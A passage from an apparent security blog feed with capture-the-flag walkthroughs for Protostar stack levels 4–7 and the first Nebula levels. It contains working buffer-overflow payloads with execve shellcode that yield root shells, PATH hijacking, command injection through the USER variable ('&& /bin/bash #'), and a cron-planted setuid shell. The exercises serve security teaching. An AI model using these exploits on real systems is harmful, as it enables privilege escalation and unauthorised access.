0xbffff78c:	0xb7fffab0	0xb7fe1b28	0xb7fd7ff4	0x00000000
(gdb) x/16x $esp-32
0xbffff73c:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff74c:	0x41414141	0x08048400	0x00000000	0xbffff7d8
0xbffff75c:	0xb7eadc76	0x00000001	0xbffff804	0xbffff80c
0xbffff76c:	0xb7fe1848	0xbffff7c0	0xffffffff	0xb7ffeff4
(gdb) 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We can see that between the end of the buffer (the last &lt;code&gt;0x41414141&lt;/code&gt; value) and the saved return address
(which is now at &lt;code&gt;$esp&lt;/code&gt; and is &lt;code&gt;0xb7eadc76&lt;/code&gt; in little endian) we have
exactly 3 DWORD (4 bytes) values. So now we can construct our payload as 64+3*4=76 bytes of &amp;ldquo;A&amp;rdquo;&amp;rsquo;s + the address of &lt;code&gt;win&lt;/code&gt; function in little endian format:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ objdump -t stack4 | grep win
080483f4 g     F .text	00000014              win
user@protostar:/opt/protostar/bin$ python -c &amp;quot;print &#39;A&#39;*76+&#39;\xf4\x83\x04\x08&#39;&amp;quot; | ./stack4
code flow successfully changed
Segmentation fault
user@protostar:/opt/protostar/bin$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;stack5:e81dfa3035f8a1263750075ad9ae5c5e&#34;&gt;Stack5&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;Stack5 is a standard buffer overflow, this time introducing shellcode.&lt;/p&gt;

&lt;p&gt;This level is at /opt/protostar/bin/stack5&lt;/p&gt;

&lt;p&gt;Hints&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;At this point in time, it might be easier to use someone elses shellcode&lt;/li&gt;
&lt;li&gt;If debugging the shellcode, use \xcc (int3) to stop the program executing and return to the debugger&lt;/li&gt;
&lt;li&gt;remove the int3s once your shellcode is done.&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;source-code-5:e81dfa3035f8a1263750075ad9ae5c5e&#34;&gt;Source Code&lt;/h4&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This level is the same as the previous one with the added difficulty of executing custom shellcode.
First we check that we still control the EIP reliably:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:~$ python -c &amp;quot;print &#39;A&#39;*76+&#39;BBBB&#39;+&#39;C&#39;*300&amp;quot; &amp;gt; /tmp/payload
user@protostar:~$ gdb -q /opt/protostar/bin/stack5
Reading symbols from /opt/protostar/bin/stack5...done.
(gdb) run &amp;lt; /tmp/payload
Starting program: /opt/protostar/bin/stack5 &amp;lt; /tmp/payload

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) x/80x $esp
0xbffff7c0:	0x43434343	0x43434343	0x43434343	0x43434343
0xbffff7d0:	0x43434343	0x43434343	0x43434343	0x43434343
0xbffff7e0:	0x43434343	0x43434343	0x43434343	0x43434343
0xbffff7f0:	0x43434343	0x43434343	0x43434343	0x43434343
0xbffff800:	0x43434343	0x43434343	0x43434343	0x43434343
0xbffff810:	0x43434343	0x43434343	0x43434343	0x43434343
0xbffff820:	0x43434343	0x43434343	0x43434343	0x43434343
0xbffff830:	0x43434343	0x43434343	0x43434343	0x43434343
0xbffff840:	0x43434343	0x43434343	0x43434343	0x43434343
0xbffff850:	0x43434343	0x43434343	0x43434343	0x43434343
0xbffff860:	0x43434343	0x43434343	0x43434343	0x43434343
0xbffff870:	0x43434343	0x43434343	0x43434343	0x43434343
0xbffff880:	0x43434343	0x43434343	0x43434343	0x43434343
0xbffff890:	0x43434343	0x43434343	0x43434343	0x43434343
0xbffff8a0:	0x43434343	0x43434343	0x43434343	0x43434343
0xbffff8b0:	0x43434343	0x43434343	0x43434343	0x43434343
0xbffff8c0:	0x43434343	0x43434343	0x43434343	0x43434343
0xbffff8d0:	0x43434343	0x43434343	0x43434343	0x43434343
0xbffff8e0:	0x43434343	0x43434343	0x43434343	0x00000000
0xbffff8f0:	0x00000005	0x00000007	0x00000007	0xb7fe3000
(gdb) 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;As we can see we cleanly overwrite the return address with &amp;ldquo;B&amp;rdquo;&amp;rsquo;s (0x42) and have plenty of space for our custom shellcode afterwards.
The &amp;ldquo;C&amp;rdquo;&amp;rsquo;s start at &lt;code&gt;0xbffff7c0&lt;/code&gt;,
but that&amp;rsquo;s inside gdb. To make a reliable jump to it we can choose a further address &lt;code&gt;0xbffff7e0&lt;/code&gt; and pad the shellcode with NOP&amp;rsquo;s.
I had a little bit of trouble choosing the shellcode, because as it turns out it&amp;rsquo;s not a straight forward task to use a simple &lt;code&gt;execve /bin/sh&lt;/code&gt; shellcode inside a &lt;code&gt;gets()&lt;/code&gt; overflow, due to the stdin getting closed out. But after a bit of googling I found this &lt;a href=&#34;https://www.exploit-db.com/exploits/13357/&#34;&gt;shellcode&lt;/a&gt;, which
addresses this exact problem (All standard bind and reverse shells should work also).&lt;/p&gt;

&lt;p&gt;So my final exploit looks like this:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:~$ python -c &amp;quot;print &#39;A&#39;*76+&#39;\xe0\xf7\xff\xbf&#39;+&#39;\x90&#39;*100+ &#39;\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80&#39;&amp;quot; &amp;gt; /tmp/payload
user@protostar:~$ /opt/protostar/bin/stack5 &amp;lt; /tmp/payload 
# id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
# 
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;stack6:e81dfa3035f8a1263750075ad9ae5c5e&#34;&gt;Stack6&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;Stack6 looks at what happens when you have restrictions on the return address.&lt;/p&gt;

&lt;p&gt;This level can be done in a couple of ways, such as finding the duplicate of the payload (objdump -s) will help with this), or ret2libc, or even return orientated programming.&lt;/p&gt;

&lt;p&gt;It is strongly suggested you experiment with multiple ways of getting your code to execute here.&lt;/p&gt;

&lt;p&gt;This level is at /opt/protostar/bin/stack6&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;source-code-6:e81dfa3035f8a1263750075ad9ae5c5e&#34;&gt;Source Code&lt;/h4&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

void getpath()
{
  char buffer[64];
  unsigned int ret;

  printf(&amp;quot;input path please: &amp;quot;); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret &amp;amp; 0xbf000000) == 0xbf000000) {
      printf(&amp;quot;bzzzt (%p)\n&amp;quot;, ret);
      _exit(1);
  }

  printf(&amp;quot;got path %s\n&amp;quot;, buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This level is very similar to the previous one. However, it adds an overwritten return address check - it basically disallows to return to the payload on the stack
(addresses starting with &lt;code&gt;0xbf&lt;/code&gt;). Here, the easiest solution would be to try to find if our payload is duplicated somewhere else in the process memory.&lt;/p&gt;

&lt;p&gt;Firstly, the code has a new local variable (4 bytes), so in theory our ret address has shifted by 4 bytes forward.
We can test that and try to find another copy of the payload in memory:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:~$ python -c &amp;quot;print &#39;A&#39;*80 + &#39;BBBB&#39; + &#39;C&#39;*300&amp;quot; &amp;gt; /tmp/payload
user@protostar:~$ gdb -q /opt/protostar/bin/stack6
Reading symbols from /opt/protostar/bin/stack6...done.
(gdb) run &amp;lt; /tmp/payload
Starting program: /opt/protostar/bin/stack6 &amp;lt; /tmp/payload
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBAAAAAAAAAAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) info proc mappings
process 2157
cmdline = &#39;/opt/protostar/bin/stack6&#39;
cwd = &#39;/home/user&#39;
exe = &#39;/opt/protostar/bin/stack6&#39;
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000          0        /opt/protostar/bin/stack6
	 0x8049000  0x804a000     0x1000          0        /opt/protostar/bin/stack6
	0xb7e96000 0xb7e97000     0x1000          0        
	0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
	0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
	0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
	0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
	0xb7fd9000 0xb7fdc000     0x3000          0        
	0xb7fde000 0xb7fe2000     0x4000          0        
	0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]
	0xb7fe3000 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so
	0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
	0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
	0xbffeb000 0xc0000000    0x15000          0           [stack]
(gdb) find 0xb7fde000, 0xb7fe2000, 0x42424242
0xb7fde050
0xb7fdf049
0xb7fdf059
3 patterns found.
(gdb) x/80x 0xb7fde050
0xb7fde050:	0x42424242	0x43434343	0x43434343	0x43434343
0xb7fde060:	0x43434343	0x43434343	0x43434343	0x43434343
0xb7fde070:	0x43434343	0x43434343	0x43434343	0x43434343
0xb7fde080:	0x43434343	0x43434343	0x43434343	0x43434343
0xb7fde090:	0x43434343	0x43434343	0x43434343	0x43434343
0xb7fde0a0:	0x43434343	0x43434343	0x43434343	0x43434343
0xb7fde0b0:	0x43434343	0x43434343	0x43434343	0x43434343
0xb7fde0c0:	0x43434343	0x43434343	0x43434343	0x43434343
0xb7fde0d0:	0x43434343	0x43434343	0x43434343	0x43434343
0xb7fde0e0:	0x43434343	0x43434343	0x43434343	0x43434343
0xb7fde0f0:	0x43434343	0x43434343	0x43434343	0x43434343
0xb7fde100:	0x43434343	0x43434343	0x43434343	0x43434343
0xb7fde110:	0x43434343	0x43434343	0x43434343	0x43434343
0xb7fde120:	0x43434343	0x43434343	0x43434343	0x43434343
0xb7fde130:	0x43434343	0x43434343	0x43434343	0x43434343
0xb7fde140:	0x43434343	0x43434343	0x43434343	0x43434343
0xb7fde150:	0x43434343	0x43434343	0x43434343	0x43434343
0xb7fde160:	0x43434343	0x43434343	0x43434343	0x43434343
0xb7fde170:	0x43434343	0x43434343	0x43434343	0x43434343
0xb7fde180:	0x0000000a	0x00000000	0x00000000	0x00000000
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;As we can see we have cleanly overwritten the ret address with &amp;ldquo;B&amp;rdquo;&amp;rsquo;s and have found a possible duplicate address for our shellcode at &lt;code&gt;0xb7fde054&lt;/code&gt; (where the &amp;ldquo;C&amp;rdquo;&amp;rsquo;s start).
Now we can actually reuse the payload from the previous level by just adjusting number of &amp;ldquo;A&amp;rdquo;&amp;rsquo;s from 76 to 80 and changing the return address to &lt;code&gt;0xb7fde080&lt;/code&gt;
(again a little into the nopsled for reliability):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:~$ python -c &amp;quot;print &#39;A&#39;*80+&#39;\x80\xe0\xfd\xb7&#39;+&#39;\x90&#39;*100+ &#39;\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80&#39;&amp;quot; &amp;gt; /tmp/payload
user@protostar:~$ /opt/protostar/bin/stack6 &amp;lt; /tmp/payload 
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAï¿½ï¿½ï¿½ï¿½AAAAAAAAAAAAï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½1ï¿½1Û°Í€Sh/ttyh/devï¿½ï¿½1ï¿½fï¿½&#39;ï¿½Í€1ï¿½Ph//shh/binï¿½ï¿½PSï¿½á™°

# id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
# 
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;stack7:e81dfa3035f8a1263750075ad9ae5c5e&#34;&gt;Stack7&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;Stack7 introduces return to .text to gain code execution.&lt;/p&gt;

&lt;p&gt;The metasploit tool â€œmsfelfscanâ€ can make searching for suitable instructions very easy, otherwise looking through objdump output will suffice.&lt;/p&gt;

&lt;p&gt;This level is at /opt/protostar/bin/stack7&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;source-code-7:e81dfa3035f8a1263750075ad9ae5c5e&#34;&gt;Source Code&lt;/h4&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

char *getpath()
{
  char buffer[64];
  unsigned int ret;

  printf(&amp;quot;input path please: &amp;quot;); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret &amp;amp; 0xb0000000) == 0xb0000000) {
      printf(&amp;quot;bzzzt (%p)\n&amp;quot;, ret);
      _exit(1);
  }

  printf(&amp;quot;got path %s\n&amp;quot;, buffer);
  return strdup(buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This level adds another, even stricter, check for the return address, which invalidates the stack6 solution,
as now we cannot return to any address starting with &lt;code&gt;0xb&lt;/code&gt;.
However, if we return to an address anywhere in the file which contains the opcode for the &lt;code&gt;RET&lt;/code&gt; instruction -
that instruction will pop the next address from the stack
and this address won&amp;rsquo;t have any restrictions. So, we can still reuse the code from previous level with a small detour to pass the ret check.&lt;/p&gt;

&lt;p&gt;We can use the &lt;code&gt;RET&lt;/code&gt; instruction from the &lt;code&gt;main()&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:~$ gdb -q /opt/protostar/bin/stack7
Reading symbols from /opt/protostar/bin/stack7...done.
(gdb) disassemble main
Dump of assembler code for function main:
0x08048545 &amp;lt;main+0&amp;gt;:	push   %ebp
0x08048546 &amp;lt;main+1&amp;gt;:	mov    %esp,%ebp
0x08048548 &amp;lt;main+3&amp;gt;:	and    $0xfffffff0,%esp
0x0804854b &amp;lt;main+6&amp;gt;:	call   0x80484c4 &amp;lt;getpath&amp;gt;
0x08048550 &amp;lt;main+11&amp;gt;:	mov    %ebp,%esp
0x08048552 &amp;lt;main+13&amp;gt;:	pop    %ebp
0x08048553 &amp;lt;main+14&amp;gt;:	ret    
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;As we can see it&amp;rsquo;s address is &lt;code&gt;0x08048553&lt;/code&gt;. For the second address (location of the shellcode on the stack) - we can try to use the approximate address of &lt;code&gt;0xbffff7e0&lt;/code&gt; (from stack5 level) to try to land inside the nopsled.
So, with these adjustments, we can execute our shellcode:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:~$ python -c &amp;quot;print &#39;A&#39;*80+&#39;\x53\x85\x04\x08&#39;+&#39;\xe0\xf7\xff\xbf&#39;+&#39;\x90&#39;*100+ &#39;\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80&#39;&amp;quot; &amp;gt; /tmp/payload
user@protostar:~$ /opt/protostar/bin/stack7 &amp;lt; /tmp/payload
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAASï¿½AAAAAAAAAAAASï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½1ï¿½1Û°Í€Sh/ttyh/devï¿½ï¿½1ï¿½fï¿½&#39;ï¿½Í€1ï¿½Ph//shh/binï¿½ï¿½PSï¿½á™°

# id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
# 
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>Nebula Exploit Exercises</title>
      <link>http://mislusnys.github.io/blog/2016/05/02/nebula-exploit-exercises/</link>
      <pubDate>Mon, 02 May 2016 04:28:35 +0000</pubDate>
      
      <guid>http://mislusnys.github.io/blog/2016/05/02/nebula-exploit-exercises/</guid>
      <description>

&lt;h2 id=&#34;intro:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Intro&lt;/h2&gt;

&lt;p&gt;Ever since I stumbled upon exploit exercises website - I wanted to try the challenges. They have three main exploitable VMs: Nebula, Protostar and Fusion.
The order represents the suggested progression path.&lt;/p&gt;

&lt;p&gt;The welcome page reads:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;exploit-exercises.com provides a variety of virtual machines, documentation and challenges&lt;/em&gt;
&lt;em&gt;that can be used to learn about a variety of computer&lt;/em&gt;
&lt;em&gt;security issues such as privilege escalation, vulnerability analysis, exploit development,&lt;/em&gt;
&lt;em&gt;debugging, reverse engineering, and general cyber security issues.&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Here, I wrote down some of the findings while exploring the Nebula VM.&lt;/p&gt;

&lt;h2 id=&#34;about:2941ec772c52d0561257d6ef26aa317a&#34;&gt;About&lt;/h2&gt;

&lt;p&gt;Nebula takes the participant through a variety of common (and less than common) weaknesses and vulnerabilities in Linux. It takes a look at&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;SUID files&lt;/li&gt;
&lt;li&gt;Permissions&lt;/li&gt;
&lt;li&gt;Race conditions&lt;/li&gt;
&lt;li&gt;Shell meta-variables&lt;/li&gt;
&lt;li&gt;$PATH weaknesses&lt;/li&gt;
&lt;li&gt;Scripting language weaknesses&lt;/li&gt;
&lt;li&gt;Binary compilation failures&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;At the end of Nebula, the user will have a reasonably thorough understanding of local attacks against Linux systems, and a cursory look at some of the remote attacks that are possible.&lt;/p&gt;

&lt;h3 id=&#34;level00:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Level00&lt;/h3&gt;

&lt;h4 id=&#34;description:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Description:&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;This level requires you to find a Set User ID program that will run as the â€œflag00â€ account.
You could also find this by carefully looking in top level directories in / for suspicious looking directories.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;To find the files:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level00@nebula:~$ find / -user flag00 -perm -4000 -exec ls -l {} \; 2&amp;gt;/dev/null
-rwsr-x--- 1 flag00 level00 7358 2011-11-20 21:22 /bin/.../flag00
-rwsr-x--- 1 flag00 level00 7358 2011-11-20 21:22 /rofs/bin/.../flag00
level00@nebula:~$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Getting the flag:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level00@nebula:~$ id
uid=1001(level00) gid=1001(level00) groups=1001(level00)
level00@nebula:~$ /bin/.../flag00 
Congrats, now run getflag to get your flag!
flag00@nebula:~$ getflag 
You have successfully executed getflag on a target account
flag00@nebula:~$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;level01:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Level01&lt;/h3&gt;

&lt;h4 id=&#34;description-1:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Description:&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;source-code:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Source Code:&lt;/h4&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;

int main(int argc, char **argv, char **envp)
{
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system(&amp;quot;/usr/bin/env echo and now what?&amp;quot;);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Here the code uses &lt;code&gt;echo&lt;/code&gt; binary to display a string. We can exploit that by modifying &lt;code&gt;$PATH&lt;/code&gt; environment variable and placing our own version of echo in the PATH.
We can use the provided source code to get a shell by modifying the last line to execute &lt;em&gt;bash&lt;/em&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level01@nebula:/home/flag01$ export PATH=/tmp:$PATH
level01@nebula:/home/flag01$ cat /tmp/setuid.c 
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;

int main(int argc, char **argv, char **envp)
{
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system(&amp;quot;/bin/bash&amp;quot;);
}
level01@nebula:/home/flag01$ gcc /tmp/setuid.c -o /tmp/echo
level01@nebula:/home/flag01$ ./flag01 
flag01@nebula:/home/flag01$ getflag 
You have successfully executed getflag on a target account
flag01@nebula:/home/flag01$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;level02:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Level02&lt;/h3&gt;

&lt;h4 id=&#34;description-2:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Description:&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;source-code-1:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Source Code:&lt;/h4&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;

int main(int argc, char **argv, char **envp)
{
  char *buffer;

  gid_t gid;
  uid_t uid;

  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  buffer = NULL;

  asprintf(&amp;amp;buffer, &amp;quot;/bin/echo %s is cool&amp;quot;, getenv(&amp;quot;USER&amp;quot;));
  printf(&amp;quot;about to call system(\&amp;quot;%s\&amp;quot;)\n&amp;quot;, buffer);
  
  system(buffer);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Here, we can inject additional commands into the &lt;code&gt;$USER&lt;/code&gt; environment variable and terminate the buffer with &lt;code&gt;#&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level02@nebula:/home/flag02$ export USER=&amp;quot;user &amp;amp;&amp;amp; /bin/bash #&amp;quot;
level02@nebula:/home/flag02$ ./flag02 
about to call system(&amp;quot;/bin/echo user &amp;amp;&amp;amp; /bin/bash # is cool&amp;quot;)
user
flag02@nebula:/home/flag02$ getflag 
You have successfully executed getflag on a target account
flag02@nebula:/home/flag02$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;level03:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Level03&lt;/h3&gt;

&lt;h4 id=&#34;description-3:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Description:&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;Check the home directory of flag03 and take note of the files there.
There is a crontab that is called every couple of minutes.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;This level runs crontab every few minutes which executes anything from &lt;code&gt;writable.d&lt;/code&gt; folder and then clears it.
We can reuse &lt;code&gt;/tmp/setuid.c&lt;/code&gt; file from previous levels:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level03@nebula:/home/flag03/writable.d$ cat exploit.sh
#!/bin/bash

gcc /tmp/setuid.c -o /home/flag03/shell
chmod +s /home/flag03/shell
level03@nebula:/home/flag03/writable.d$ cd ..
level03@nebula:/home/flag03$ ./shell
flag03@nebula:/home/flag03$ getflag 
You have successfully executed getflag on a target account
flag03@nebula:/home/flag03$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;level04:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Level04&lt;/h3&gt;

&lt;h4 id=&#34;description-4:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Description:&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;This level requires you to read the token file, but the code restricts the files that can be read. Find a way to bypass it :)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;source-code-2:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Source Code:&lt;/h4&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;

int main(int argc, char **argv, char **envp)
{
  char buf[1024];
  int fd, rc;

  if(argc == 1) {
      printf(&amp;quot;%s [file to read]\n&amp;quot;, argv[0]);
      exit(EXIT_FAILURE);
  }

  if(strstr(argv[1], &amp;quot;token&amp;quot;) != NULL) {
      printf(&amp;quot;You may not access &#39;%s&#39;\n&amp;quot;, argv[1]);
      exit(EXIT_FAILURE);
  }

  fd = open(argv[1], O_RDONLY);
  if(fd == -1) {
      err(EXIT_FAILURE, &amp;quot;Unable to open %s&amp;quot;, argv[1]);
  }

  rc = read(fd, buf, sizeof(buf));
  
  if(rc == -1) {
      err(EXIT_FAILURE, &amp;quot;Unable to read fd %d&amp;quot;, fd);
  }

